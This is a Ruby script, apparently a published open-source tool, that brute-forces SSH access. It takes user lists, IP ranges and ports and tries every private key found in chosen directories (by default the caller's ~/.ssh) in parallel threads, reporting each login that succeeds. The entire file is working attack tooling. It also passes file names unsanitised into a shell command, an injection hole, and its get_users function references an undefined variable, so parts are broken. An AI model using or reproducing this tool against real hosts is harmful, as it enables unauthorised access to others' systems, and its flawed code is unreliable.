#!/usr/bin/env ruby
# A script to brute force SSH using SSH keys.
# by Miles Whittaker <mj@whitta.dev>
#
# --------------------------------------------------------------------
# The MIT License (MIT)
#
# Copyright (c) 2020 Miles Whittaker
#
# Permission is hereby granted, free of charge, to any person
# obtaining a copy of this software and associated documentation files
# (the "Software"), to deal in the Software without restriction,
# including without limitation the rights to use, copy, modify, merge,
# publish, distribute, sublicense, and/or sell copies of the Software,
# and to permit persons to whom the Software is furnished to do so,
# subject to the following conditions:
#
# The above copyright notice and this permission notice shall be
# included in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# --------------------------------------------------------------------

require "etc"
require "io/console"
require "ipaddr"
require "net/ssh"
require "optparse"
require "pathname"
require 'socket'

class Exit
    GOOD = 0
    INVALID_OPTION = 1
    INVALID_ARGUMENT = 2
    MISSING_ARGUMENT = 3
    EXTRA_ARGUMENTS = 4
    EXCEPTION = 5
    AMBIGUOUS_ARGUMENT = 6
end

$mutex = Mutex.new

def brute_force(ips, users, keys, ports, threads)
    user_count = 0
    user_tot = users.size
    key_count = 0
    key_tot = keys.size
    ip_count = 0
    ip_tot = ips.size
    port_count = 0
    port_tot = ports.size

    progress = Thread.new do
        puts "### Progress ###"
        puts "User:    #{user_count}/#{user_tot}"
        puts "Key:     #{key_count}/#{key_tot}"
        puts "IP:      #{ip_count}/#{ip_tot}"
        puts "Port:    #{port_count}/#{port_tot}"
        puts "Threads: #{Thread.list.size}"
        puts

        $halt_progress = false
        while (!$halt_progress) do
            if ($stdin.readchar.gsub(".", ""))
                puts "### Progress ###"
                puts "User:    #{user_count}/#{user_tot}"
                puts "Key:     #{key_count}/#{key_tot}"
                puts "IP:      #{ip_count}/#{ip_tot}"
                puts "Port:    #{port_count}/#{port_tot}"
                puts "Threads: #{Thread.list.size}"
                puts
            end
        end
    end
    sleep 1

    users.each do |user|
        user_count += 1
        keys.each do |key|
            key_count += 1
            ips.each do |ip|
                ip_count += 1
                ports.each do |port|
                    port_count += 1

                    sleep 0.05 while (Thread.list.size > threads)

                    Thread.new do
                        ssh_login(ip, user, key, port)
                    end
                end
                port_count = 0
            end
            ip_count = 0
        end
        key_count = 0
    end

    $halt_progress = true
    progress.exit

    Thread.list.each do |t|
        t.join if (t != Thread.current)
    end
end

def get_ips(ip)
    ips = Array.new

    if (Pathname(ip).exist?)
        File.open(ip).each do |line|
            ips.concat(IPAddr.new(line.strip).to_range.to_a)
        end
    else
        ips.concat(IPAddr.new(ip).to_range.to_a)
    end

    return ips
end

def get_ports(port)
    ports = Array.new

    if (Pathname(port).exist?)
        File.open(port).each do |line|
            ports.push(line.strip.to_i)
        end
    else
        ports.push(port.to_i)
    end

    return ports
end

def get_priv_keys(args)
    priv_keys = Array.new

    if (args.empty?)
        args.push("#{Etc.getpwnam(Etc.getlogin).dir}/.ssh")
    end

    args.each do |dir|
        files = Dir[File.join(dir, "**", "*")].reject do |f|
            f.end_with?(".unknown") ||
            f.end_with?(".json") ||
            Pathname(f).directory?
        end

        files.each do |f|
            type = %x(
                head -n 1 #{f} | sed -e "s|BEGIN ||g" -e "s|-||g"
            ).rstrip

            case type
            when "DSA PRIVATE KEY", "PRIVATE KEY", "RSA PRIVATE KEY"
                priv_keys.push(f)
            end
        end
    end

    return priv_keys
end

def get_users(options)
    users = Array.new

    if (Pathname(user).exist?)
        File.open(user).each do |line|
            users.push(line.strip)
        end
    else
        users.push(user)
    end

    return users
end

def is_port_open?(ip, port)
    begin
        timeout 1 do
            begin
                s = TCPSocket.new(ip, port)
                s.close
                return true
            rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH
                return false
            end
        end
    rescue Exception
    end
    return false
end

def parse(args)
    options = Hash.new
    options["port"] = 22
    options["threads"] = 25
    options["user"] = Etc.getlogin
    options["verbose"] = false

    info = [
        "This tool will try to brute force SSH logins using SSH keys",
        "instead of passwords. If no keyDirs are provided, then",
        "~/.ssh is the default."
    ].join(" ")

    parser = OptionParser.new do |opts|
        opts.summary_width = 29

        opts.banner =
            "Usage: #{File.basename($0)} [OPTIONS] [keyDir1..keyDirN]"

        opts.on("", "DESCRIPTION")

        info.scan(/\S.{0,76}\S(?=\s|$)|\S+/).each do |line|
            opts.on("    #{line}")
        end

        opts.on("", "OPTIONS")

        opts.on("-h", "--help", "Display this help message") do
            puts opts
            exit Exit::GOOD
        end

        opts.on(
            "-i",
            "--ip-addresses=ADDRESSES",
            "Either an IP address/range or a file containing one",
            "IP address/range per line"
        ) do |ip|
            options["ip"] = ip
        end

        opts.on(
            "-p",
            "--ports=PORTS",
            "Either a port or a file containing one port per",
            "line (default: 22)"
        ) do |p|
            options["port"] = p
        end

        opts.on(
            "-t",
            "--threads=THREADS",
            "The maximum number of threads (default: 25)"
        ) do |t|
            options["threads"] = t
        end

        opts.on(
            "-u",
            "--users=USERS",
            "Either a username or a file containing one username",
            "per line (default: #{Etc.getlogin})"
        ) do |user|
            options["user"] = user
        end

        opts.on(
            "-v",
            "--verbose",
            "Show backtrace when error occurs"
        ) do
            options["verbose"] = true
        end

        opts.on(
            "",
            "EXAMPLES",
            [
                "    Run tool using the IP addresses in ips.txt, the",
                "usernames in users.txt, and the"
            ].join(" "),
            "    private keys in ~/.ssh:",
            "",
            "        brute_ssh -i ips.txt -u users.txt",
            "",
            [
                "    Run tool using the IP addresses in ips.txt, the",
                "current username, port 2020, and"
            ].join(" "),
            "    use 100 threads:",
            "",
            "        brute_ssh -i ips.txt -p 2020 -t 100"
        )
    end

    begin
        parser.parse!(args)
    rescue OptionParser::InvalidOption => e
        puts e.message
        puts parser
        exit Exit::INVALID_OPTION
    rescue OptionParser::InvalidArgument => e
        puts e.message
        puts parser
        exit Exit::INVALID_ARGUMENT
    rescue OptionParser::MissingArgument => e
        puts e.message
        puts parser
        exit Exit::MISSING_ARGUMENT
    rescue OptionParser::AmbiguousOption => e
        puts e.message
        puts parser
        exit Exit::AMBIGUOUS_ARGUMENT
    end

    if (!options["ip"])
        puts parser
        exit Exit::MISSING_ARGUMENT
    end

    return options
end

def ssh_login(ip, user, key, port)
    begin
        timeout 1 do
            Net::SSH.start(
                ip.to_s,
                user,
                :port => port,
                :keys => [key],
                :compression => "zlib",
                :auth_methods => ["publickey"]
            ) do |ssh|
            end
        end
        $mutex.synchronize do
            puts "#{user}@#{ip} w/ #{key} SUCCEEDED"
        end
    rescue Exception
        # Ignore timeout
        # $mutex.synchronize do
        #     puts e.message
        #     puts "#{user}@#{ip} w/ #{key} FAILED"
        # end
    end
end

options = parse(ARGV)

begin
    priv_keys = get_priv_keys(ARGV)
    ips = get_ips(options["ip"])
    ports = get_ports(options["port"])
    users = get_users(options["user"])
    brute_force(ips, users, priv_keys, ports, options["threads"])
rescue Interrupt
    # ^C
    # Exit gracefully
rescue Errno::EPIPE
    # Do nothing. This can happen if piping to another program such as
    # less. Usually if less is closed before we're done with STDOUT.
rescue Exception => e
    $stderr.puts "Oops! Looks like an error has occured! Maybe the " \
        "message below will help. If not,"
    $stderr.puts "you can use the --verbose flag to get a backtrace."

    $stderr.puts e.message
    if (options["verbose"])
        e.backtrace.each do |line|
            $stderr.puts line
        end
    end
    exit Exit::EXCEPTION
end
exit Exit::GOOD
